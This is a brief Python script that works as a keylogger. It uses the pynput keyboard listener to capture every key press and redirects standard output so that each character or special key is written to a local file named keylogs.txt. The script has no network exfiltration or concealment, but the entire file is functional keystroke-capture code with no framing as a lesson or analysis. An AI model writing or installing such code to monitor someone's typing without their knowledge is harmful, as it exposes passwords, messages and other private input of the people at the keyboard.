from pynput import keyboard
import os
import sys

#redirect output from terminal to file
f = open('keylogs.txt', 'w')
sys.stdout = f

#log keys
def on_press(key):
    try:
        print('{}'.format(
            key.char))
    except AttributeError:
        print('{}'.format(
            key))

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
    
f.close()

